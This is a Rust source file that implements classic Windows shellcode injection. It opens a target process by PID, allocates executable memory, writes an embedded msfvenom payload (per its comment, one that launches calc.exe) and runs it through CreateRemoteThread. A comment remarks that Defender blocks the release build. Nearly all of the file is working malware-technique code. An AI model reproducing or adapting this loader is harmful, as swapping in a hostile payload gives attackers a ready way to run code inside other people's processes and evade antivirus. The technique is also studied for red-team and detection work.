use std::ffi::c_void;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, CreateRemoteThread, LPTHREAD_START_ROUTINE};
use windows::Win32::Foundation::{HANDLE, CloseHandle};
use windows::core::Error;

struct Process {
    process_id: u32,
    handle: HANDLE,
}

impl Process {
    fn open_handle(process_id: u32) -> Result<Self, Error> {
        let desired_access: PROCESS_ACCESS_RIGHTS = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
        unsafe {
            OpenProcess(desired_access, false, process_id)
            .map(|handle| Self { process_id, handle })
        }
    }

    fn inject(&self, mut shellcode: Vec<u8>) {
        let shellcode_size = shellcode.len();
        let sc = (shellcode.as_mut_ptr()) as *mut c_void;

        unsafe { 
            let mem_addr = VirtualAllocEx(
                self.handle,
                None,
                shellcode_size,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            );

            WriteProcessMemory(
                self.handle,
                mem_addr,
                sc,
                shellcode_size,
                None
            );

            let x = std::mem::transmute::<*mut c_void, LPTHREAD_START_ROUTINE>(mem_addr); // this is ugly, should be a better way..
            let _h_remote_thread = CreateRemoteThread(
                self.handle,
                None,
                0,
                x,
                None,
                0,
                None
            );

            CloseHandle(self.handle);
        };

    }
}

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b \x00 -f rust
    // works in debug, but blocked by defender in release builds
    let shellcode = Vec::<u8>::from([0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0xd7, 0x35, 0x4d, 0xe7, 0x00, 0x6f, 0xa6, 0xc3, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x2b, 0x7d, 0xce, 0x03, 0xf0, 0x87, 0x66, 0xc3, 0xd7, 0x35, 0x0c, 0xb6, 0x41, 0x3f, 0xf4, 0x92, 0x81, 0x7d, 0x7c, 0x35, 0x65, 0x27, 0x2d, 0x91, 0xb7, 0x7d, 0xc6, 0xb5, 0x18, 0x27, 0x2d, 0x91, 0xf7, 0x7d, 0xc6, 0x95, 0x50, 0x27, 0xa9, 0x74, 0x9d, 0x7f, 0x00, 0xd6, 0xc9, 0x27, 0x97, 0x03, 0x7b, 0x09, 0x2c, 0x9b, 0x02, 0x43, 0x86, 0x82, 0x16, 0xfc, 0x40, 0xa6, 0x01, 0xae, 0x44, 0x2e, 0x85, 0x74, 0x1c, 0xaf, 0x8b, 0x3d, 0x86, 0x48, 0x95, 0x09, 0x05, 0xe6, 0xd0, 0xe4, 0x26, 0x4b, 0xd7, 0x35, 0x4d, 0xaf, 0x85, 0xaf, 0xd2, 0xa4, 0x9f, 0x34, 0x9d, 0xb7, 0x8b, 0x27, 0xbe, 0x87, 0x5c, 0x75, 0x6d, 0xae, 0x01, 0xbf, 0x45, 0x95, 0x9f, 0xca, 0x84, 0xa6, 0x8b, 0x5b, 0x2e, 0x8b, 0xd6, 0xe3, 0x00, 0xd6, 0xc9, 0x27, 0x97, 0x03, 0x7b, 0x74, 0x8c, 0x2e, 0x0d, 0x2e, 0xa7, 0x02, 0xef, 0xd5, 0x38, 0x16, 0x4c, 0x6c, 0xea, 0xe7, 0xdf, 0x70, 0x74, 0x36, 0x75, 0xb7, 0xfe, 0x87, 0x5c, 0x75, 0x69, 0xae, 0x01, 0xbf, 0xc0, 0x82, 0x5c, 0x39, 0x05, 0xa3, 0x8b, 0x2f, 0xba, 0x8a, 0xd6, 0xe5, 0x0c, 0x6c, 0x04, 0xe7, 0xee, 0xc2, 0x07, 0x74, 0x15, 0xa6, 0x58, 0x31, 0xff, 0x99, 0x96, 0x6d, 0x0c, 0xbe, 0x41, 0x35, 0xee, 0x40, 0x3b, 0x15, 0x0c, 0xb5, 0xff, 0x8f, 0xfe, 0x82, 0x8e, 0x6f, 0x05, 0x6c, 0x12, 0x86, 0xf1, 0x3c, 0x28, 0xca, 0x10, 0xaf, 0xba, 0x6e, 0xa6, 0xc3, 0xd7, 0x35, 0x4d, 0xe7, 0x00, 0x27, 0x2b, 0x4e, 0xd6, 0x34, 0x4d, 0xe7, 0x41, 0xd5, 0x97, 0x48, 0xb8, 0xb2, 0xb2, 0x32, 0xbb, 0x8f, 0xbb, 0xe9, 0xdd, 0x74, 0xf7, 0x41, 0x95, 0xd2, 0x3b, 0x3c, 0x02, 0x7d, 0xce, 0x23, 0x28, 0x53, 0xa0, 0xbf, 0xdd, 0xb5, 0xb6, 0x07, 0x75, 0x6a, 0x1d, 0x84, 0xc4, 0x47, 0x22, 0x8d, 0x00, 0x36, 0xe7, 0x4a, 0x0d, 0xca, 0x98, 0x84, 0x61, 0x03, 0xc5, 0xed, 0xb2, 0x4d, 0x28, 0xe7, 0x00, 0x6f, 0xa6, 0xc3]);
    
    let process_id: u32 = 15412;

    let target_process = Process::open_handle(process_id).expect("Could not get handle to target process!");
    target_process.inject(shellcode);
}